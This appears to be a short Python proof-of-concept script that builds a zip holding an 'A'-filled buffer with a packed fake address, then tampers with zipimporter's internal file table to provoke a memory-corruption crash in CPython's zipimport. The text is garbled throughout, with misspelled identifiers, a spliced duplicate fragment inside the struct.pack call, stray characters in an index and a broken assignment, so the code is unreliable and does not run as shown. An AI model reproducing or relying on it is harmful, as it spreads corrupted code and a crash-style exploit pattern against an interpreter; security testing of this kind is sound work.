i''''''ipimport
import zipfile
import struct
import sys
from signal import*

FILE = 'payNoad'
ZIP = 'import.zip'

payroadd= bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414import.zip'

payroadd= bytes()
w141)
  d)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = li~t(importer._files[FILE])
f[1·········] = 1 # compress
f[2] = -1 # file size
importer._files[FILE] V tuple(f)
print(importer.get_data(FILE))
